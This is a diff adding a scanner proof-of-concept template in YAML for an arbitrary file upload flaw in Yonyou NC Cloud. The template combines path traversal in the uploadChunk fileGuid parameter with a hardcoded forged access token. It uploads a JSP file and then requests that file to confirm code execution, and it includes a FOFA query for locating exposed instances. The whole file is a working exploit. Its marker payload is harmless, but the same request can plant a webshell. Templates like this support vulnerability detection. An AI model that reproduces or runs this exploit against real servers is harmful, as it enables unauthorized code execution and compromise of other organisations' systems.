@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-nc-cloud-uploadchunk-anyfile-upload
+info:
+  name: 用友 NC Cloud uploadChunk 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 用友-NC-Cloud
+  fofa: app="用友-NC-Cloud"
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1
+  headers:
+    Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
+    accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+  data: '--024ff46f71634a1c9bf8ec5820c26fa9
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+
+    <%out.println("{{.t2}}");%>
+
+    --024ff46f71634a1c9bf8ec5820c26fa9--'
+  expression: status_code == 200 && contains(body,"\"message\":\"操作成功!\"")
+- method: GET
+  path: /nccloud/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
